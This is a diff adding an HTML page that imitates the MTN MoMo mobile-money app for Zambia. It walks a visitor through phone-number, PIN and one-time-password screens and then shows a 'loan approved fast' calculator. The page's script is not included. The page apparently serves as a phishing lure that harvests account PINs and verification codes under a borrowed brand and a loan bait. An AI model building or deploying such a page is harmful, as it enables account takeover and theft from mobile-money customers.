@@ -1,0 +1,657 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MoMo Loan Calculator</title>
+    <style>
+        :root {
+            --momo-blue: #0b4f6c;
+            --momo-yellow: #fca311;
+            --momo-green: #2a9d8f;
+            --momo-light-green: #e9f5f4;
+            --bg-color: #f4f6f9;
+            --card-bg: #ffffff;
+            --text-main: #333333;
+            --text-sub: #777777;
+            --border-color: #d1d5db;
+            --slider-track: #e5e7eb;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* App Container */
+        .app-container {
+            width: 100%;
+            max-width: 420px;
+            background-color: var(--card-bg);
+            border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            position: relative;
+            min-height: 750px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Screen Management */
+        .screen {
+            display: none;
+            flex-direction: column;
+            flex: 1;
+            padding: 24px;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Common UI Elements */
+        .header-logo {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background-color: var(--momo-blue);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--momo-yellow);
+            font-weight: bold;
+            font-size: 24px;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--momo-yellow);
+            margin-left: 10px;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-text span {
+            color: var(--momo-blue);
+            font-size: 12px;
+            display: block;
+            margin-top: -5px;
+        }
+
+        .welcome-text {
+            color: var(--momo-blue);
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+
+        .btn-primary {
+            background-color: var(--momo-blue);
+            color: white;
+            text-transform: uppercase;
+            box-shadow: 0 4px 6px rgba(11, 79, 108, 0.3);
+        }
+
+        .btn-primary:hover {
+            background-color: #083a50;
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary {
+            background-color: var(--momo-light-green);
+            color: var(--momo-green);
+        }
+
+        .btn-secondary:hover {
+            background-color: #d1ebe8;
+        }
+
+        /* Input Fields */
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: var(--text-sub);
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--momo-blue);
+        }
+
+        /* --- Screen 1: Phone Entry --- */
+        #screen-phone .header-area {
+            background-color: var(--momo-blue);
+            margin: -24px -24px 0 -24px;
+            padding: 40px 24px 20px;
+            border-radius: 0 0 40px 40px;
+            text-align: center;
+            color: white;
+        }
+
+        .flag-input {
+            display: flex;
+            gap: 10px;
+        }
+
+        .flag-input select {
+            padding: 14px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 16px;
+            background: white;
+            outline: none;
+        }
+
+        /* --- Screen 2: PIN Entry --- */
+        #screen-pin .logo-center {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .pin-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .pin-inputs input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .pin-inputs input:focus {
+            border-color: var(--momo-blue);
+        }
+
+        /* --- Screen 3: OTP Entry --- */
+        .otp-texts {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .otp-texts input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            outline: none;
+            background-color: #f9fafb;
+        }
+
+        .otp-texts input:focus {
+            border-color: var(--momo-blue);
+            background-color: white;
+        }
+
+        .otp-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .resend-text {
+            color: var(--text-sub);
+            font-size: 14px;
+            padding: 12px;
+            background-color: #f3f4f6;
+            width: 100%;
+            text-align: center;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        /* --- Screen 4: Loan Calculator --- */
+        #screen-calculator .header-area {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--momo-green);
+        }
+
+        .hero-section {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .hero-section h2 {
+            color: var(--momo-green);
+            font-size: 22px;
+            margin-bottom: 8px;
+        }
+
+        .hero-section h2 span {
+            color: var(--momo-blue);
+        }
+
+        .hero-section p {
+            color: var(--text-sub);
+            font-size: 13px;
+        }
+
+        .calculator-card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .calc-title {
+            text-align: center;
+            font-size: 18px;
+            color: var(--text-main);
+            margin-bottom: 24px;
+            font-family: 'Georgia', serif;
+        }
+
+        .amount-section {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .amount-section label {
+            font-size: 12px;
+            color: var(--text-sub);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .amount-section h3 {
+            font-size: 32px;
+            color: var(--text-main);
+            font-family: 'Georgia', serif;
+            margin: 8px 0 16px;
+        }
+
+        /* Slider */
+        .slider-container {
+            margin-bottom: 24px;
+        }
+
+        input[type=range] {
+            -webkit-appearance: none;
+            width: 100%;
+            background: transparent;
+        }
+
+        input[type=range]:focus {
+            outline: none;
+        }
+
+        input[type=range]::-webkit-slider-runnable-track {
+            width: 100%;
+            height: 6px;
+            cursor: pointer;
+            background: var(--slider-track);
+            border-radius: 3px;
+        }
+
+        input[type=range]::-webkit-slider-thumb {
+            height: 24px;
+            width: 24px;
+            border-radius: 50%;
+            background: #ffffff;
+            border: 4px solid var(--momo-blue);
+            cursor: pointer;
+            -webkit-appearance: none;
+            margin-top: -9px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .slider-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: var(--text-sub);
+            margin-top: 8px;
+        }
+
+        /* Term Buttons */
+        .term-section {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .term-section label {
+            font-size: 12px;
+            color: var(--text-sub);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .term-section h3 {
+            font-size: 24px;
+            color: var(--text-main);
+            font-family: 'Georgia', serif;
+            margin: 8px 0 16px;
+        }
+
+        .term-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+
+        .term-btn {
+            padding: 12px 0;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            background: white;
+            font-size: 14px;
+            color: var(--text-main);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .term-btn.active {
+            background-color: var(--momo-green);
+            color: white;
+            border-color: var(--momo-green);
+            font-weight: bold;
+        }
+
+        /* Result Box */
+        .result-box {
+            background-color: #f8fafc;
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 24px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .result-box label {
+            font-size: 12px;
+            color: var(--text-sub);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .result-box h2 {
+            font-size: 28px;
+            color: var(--text-main);
+            font-family: 'Georgia', serif;
+            margin: 8px 0 4px;
+        }
+
+        .result-box p {
+            font-size: 12px;
+            color: var(--text-sub);
+        }
+
+        /* Navigation */
+        .nav-bottom {
+            margin-top: auto;
+            display: flex;
+            justify-content: center;
+        }
+
+        .nav-bottom .btn {
+            width: 100%;
+        }
+
+        /* Success Screen */
+        #screen-success {
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            background-color: #dcfce7;
+            color: #16a34a;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            margin-bottom: 20px;
+        }
+
+        .success-title {
+            color: #16a34a;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .success-text {
+            color: var(--text-sub);
+            font-size: 14px;
+        }
+
+        /* Utility */
+        .hidden {
+            display: none !important;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .mt-4 {
+            margin-top: 16px;
+        }
+
+        .text-sm {
+            font-size: 12px;
+            color: var(--text-sub);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <!-- Screen 1: Phone Entry -->
+        <div id="screen-phone" class="screen active">
+            <div class="header-area">
+                <div style="display: flex; justify-content: center; margin-bottom: 20px;">
+                    <div class="logo-icon">M</div>
+                    <div class="logo-text" style="color: var(--momo-yellow);">MoMo<br><span style="color: white;">from MTN</span></div>
+                </div>
+            </div>
+            
+            <div style="flex: 1; display: flex; flex-direction: column; justify-content: center;">
+                <h3 class="text-center" style="margin-bottom: 20px; color: var(--momo-blue);">Welcome to MoMo</h3>
+                <div class="input-group">
+                    <label>Phone Number</label>
+                    <div class="flag-input">
+                        <select>
+                            <option>🇿🇲 +260</option>
+                        </select>
+                        <input type="tel" id="phone-input" placeholder="970000000" value="256580895">
+                    </div>
+                </div>
+                <button class="btn btn-primary" onclick="goToPin()">Next</button>
+                <p class="text-center text-sm mt-4">By using this app you agree to our Mobile Terms of use and Privacy Policy</p>
+            </div>
+        </div>
+
+        <!-- Screen 2: PIN Entry -->
+        <div id="screen-pin" class="screen">
+            <div class="logo-center">
+                <div style="display: flex; justify-content: center; margin-bottom: 15px;">
+                    <div class="logo-icon" style="width: 70px; height: 70px; font-size: 32px;">M</div>
+                </div>
+                <div class="logo-text" style="font-size: 28px;">MoMo<br><span style="font-size: 14px;">from MTN</span></div>
+            </div>
+            
+            <h3 class="text-center" style="margin-bottom: 10px; color: var(--text-main); font-family: Georgia, serif;">Enter your PIN</h3>
+            
+            <div class="pin-inputs" id="pin-container">
+                <input type="password" maxlength="1" oninput="moveToNext(this, 'pin')">
+                <input type="password" maxlength="1" oninput="moveToNext(this, 'pin')">
+                <input type="password" maxlength="1" oninput="moveToNext(this, 'pin')">
+                <input type="password" maxlength="1" oninput="moveToNext(this, 'pin')">
+                <input type="password" maxlength="1" oninput="moveToNext(this, 'pin')">
+            </div>
+            
+            <p class="text-center text-sm" style="margin-bottom: 20px; cursor: pointer; text-decoration: underline;">Forgot PIN?</p>
+            
+            <button class="btn btn-primary" onclick="goToOtp()">Login</button>
+        </div>
+
+        <!-- Screen 3: OTP Entry -->
+        <div id="screen-otp" class="screen">
+            <h3 class="text-center" style="margin-bottom: 10px; color: var(--text-main); font-family: Georgia, serif; font-size: 20px;">OTP Verification</h3>
+            <p class="text-center text-sm" style="margin-bottom: 20px; line-height: 1.5;">
+                We have sent a one-time password (OTP) to your number <strong>256580895</strong>. Enter it here to verify.
+            </p>
+            
+            <div class="otp-texts" id="otp-container">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 'otp')">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 'otp')">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 'otp')">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 'otp')">
+            </div>
+
+            <div class="text-center" style="margin-bottom: 15px;">
+                <span class="text-sm">Your OTP: </span>
+                <strong style="font-family: Georgia, serif; color: var(--momo-blue); letter-spacing: 2px;">----</strong>
+            </div>
+
+            <button class="btn btn-primary" onclick="goToSuccess()">Verify OTP</button>
+            
+            <div class="otp-actions">
+                <div class="resend-text" id="resend-btn">Resend in 58s</div>
+                <div class="resend-text" style="background: transparent; color: var(--text-main); cursor: pointer;" onclick="clearOtp()">Clear</div>
+            </div>
+        </div>
+
+        <!-- Screen 4: Success -->
+        <div id="screen-success" class="screen">
+            <div class="success-icon">✓</div>
+            <h3 class="success-title">Verification Successful!</h3>
+            <p class="success-text">You will be redirected shortly...</p>
+        </div>
+
+        <!-- Screen 5: Loan Calculator -->
+        <div id="screen-calculator" class="screen">
+            <div class="header-area">
+                <div style="display: flex; align-items: center;">
+                    <div class="logo-icon" style="width: 40px; height: 40px; font-size: 18px; background: var(--momo-blue);">M</div>
+                    <div class="logo-text" style="font-size: 18px; margin-left: 8px;">MoMo<br><span style="font-size: 10px;">from MTN</span></div>
+                </div>
+                <div class="welcome-text">Welcome</div>
+            </div>
+
+            <div class="hero-section">
+                <h2>Get Your Loan Approved <span>Fast</span></h2>
+                <p>Quick approval • Competitive rates • Flexible terms</p>
+            </div>
+
+            <div class="calculator-card">
+                <div class="calc-title">Loan Calculator</div>
+
+                <div class="amount-section">
+                    <label>Loan Amount</label>
+                    <h3 id="amount-display">ZMW 5,000</h3>
+                    <div class="slider-container">
+                        <input type="range" id="amount-slider" min="1000" max="200000" step="500" value="5000">
+                        <div class="slider-labels">
+                            <span>ZMW 1,000</span>
+                            <span>ZMW 200,000</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="term-section">
+                    <label>Loan Term</label>
+                    <h3 id="term-display">12 months</h3>
+                    <div class="term-grid" id="term-grid">
+                        <button class="term-btn" data-months="6">6 months</button>
+                        <button class="term-btn active" data-months="12">12 months</button>
+                        <button class="term-btn" data-months="24">24 months</button>
+                        <button class="term-btn" data-months="36">36 months</button>
+                        <button class="term-btn" data-months="48">48 months</button>
+                        <button class="term-btn" data-months="60">60 months</button>
+                    </div>
+                </div>
+
+                <div class="result-box">
+                    <label>Monthly Payment</label>
+                    <h2 id="monthly-payment">ZMW 426.89</h2>
+                    <p>Interest rate: 4.5% APR</p>
+                </div>
+
+                <div class="nav-bottom">
+                    <button class="btn btn-primary">Apply Now</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    
